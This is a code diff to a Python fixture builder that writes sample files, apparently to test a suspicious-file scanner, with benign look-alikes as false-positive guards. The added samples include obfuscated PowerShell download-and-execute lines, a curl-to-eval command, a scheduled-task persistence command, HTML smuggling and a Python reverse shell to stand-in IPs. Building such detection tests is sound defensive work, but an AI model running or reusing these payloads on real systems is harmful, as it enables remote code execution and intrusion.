@@ -222,6 +222,32 @@ def build_folder(root):
                 b"\"upd\"=\"C:\\\\g\\\\upd.exe\"\r\n")
     w("evil.url", b"[InternetShortcut]\r\nURL=file://C:\\\\g\\\\upd.exe\r\n")
     w("good.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n")
+    w("backtick.ps1", b"$c = New-Object Net.WebClient; I`E`X ($c.DownloadString('http://5.5.5.5/a'))\n")
+    import base64 as _b64
+    _enc = _b64.b64encode(b"powershell -nop -w hidden -exec bypass IEX (New-Object "
+                          b"Net.WebClient).DownloadString('http://4.4.4.4/x') " * 2)
+    w("enc2.bat", b"@echo off\r\npowershell -ec " + _enc + b"\r\n")
+    w("peek.ps1", b"$d = '" + _b64.b64encode(
+        "powershell IEX (New-Object Net.WebClient).DownloadString('http://9.9.9.9/a') "
+        .encode("utf-16-le")) + b"'; IEX [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($d))\n")
+    w("task.bat", b"@echo off\r\nschtasks /create /tn updt /tr %TEMP%\\a.exe /sc onlogon\r\n")
+    w("wsh.wsf", b"<?xml version=\"1.0\"?>\n<package><job><script language=\"VBScript\">\n"
+                 b'Set s = CreateObject("WScript.Shell")\ns.Run "powershell -w hidden -enc AAA"\n'
+                 b"</script></job></package>\n")
+    w("smuggle.html", b"<html><script>var d=atob('XNlcg==');var b=new Blob([d],"
+                       b"{type:'application/octet-stream'});var a=document.createElement('a');"
+                       b"a.href=URL.createObjectURL(b);a.click();</script></html>")
+    w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
+    w("rev.py", b"import socket,os,subprocess\ns=socket.socket(2,1)\n"
+                 b"s.connect(('7.7.7.7',9001))\nfor f in (0,1,2): os.dup2(s.fileno(),f)\n"
+                 b"subprocess.call(['/bin/sh','-i'])\n")
+    # benign look-alikes (false-positive guards)
+    w("chart.html", b"<html><script>var cfg=atob('PGNvbmZpZz48L2NvbmZpZ4=');"
+                     b"document.write(cfg);</script></html>")
+    w("serve.py", b"import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 8080))\n"
+                   b"s.listen()\nwhile True:\n    c, a = s.accept()\n    c.send(b'hello')\n    c.close()\n")
+    w("dl.sh", b"set -e\ncurl -fsSL https://example.com/data.tar.gz -o /tmp/data.tar.gz\n"
+                b"tar -xzf /tmp/data.tar.gz\n")
     craft_lnk(os.path.join(root, "readme.lnk"))
     craft_lnk(os.path.join(root, "game.lnk"), args=b"C:\\Games\\game.exe", good_clsid=True)
 
